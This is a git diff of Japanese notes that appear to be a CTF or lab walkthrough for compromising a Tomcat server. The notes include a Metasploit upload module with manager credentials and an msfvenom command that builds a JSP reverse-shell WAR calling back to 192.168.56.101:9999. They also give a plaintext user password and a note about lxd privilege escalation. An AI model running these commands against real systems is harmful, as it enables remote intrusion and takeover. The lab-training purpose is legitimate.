@@ -29,7 +29,8 @@ exploit
   - `List Application`を選択する
   - 真ん中のところに`WAR file to deploy`ここから、reverse-shellをuploadする 
 
-- msfconsoleを使って、reverse-shellをする
+- ２つの方法でリバースシェルできる。
+- (1)msfconsoleを使って、reverse-shellをする
 ```
 msfconsole -q
 search exploit tomcat upload
@@ -42,7 +43,7 @@ set httppassword role1
 run
 ```
 
-- ブラウザからmsfvenomをuploadしてリバースシェルする 
+- (2)ブラウザからmsfvenomをuploadしてリバースシェルする 
   - msfvenomを作る
   - これはphp-reverse-shell.phpのJava言語に替えたもの
   - `msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.56.101 lport=9999 -f war > shell9999.war`
@@ -62,7 +63,7 @@ run
   - sshでもできるが、suコマンドやってみる   
   - `su thales` 
   - passwordは`vodka06`
-  - `id`コマンドすると、sudo,lxdがある。`sudo su`はできないので、lxdはできるかも
+  - `id`コマンドすると、sudo,lxdがある。`sudo su(またはsudo -i)`はできないので、lxdはできるかも
   - thalesで`sudo -l`やってみても何もない
 
 - rootになる
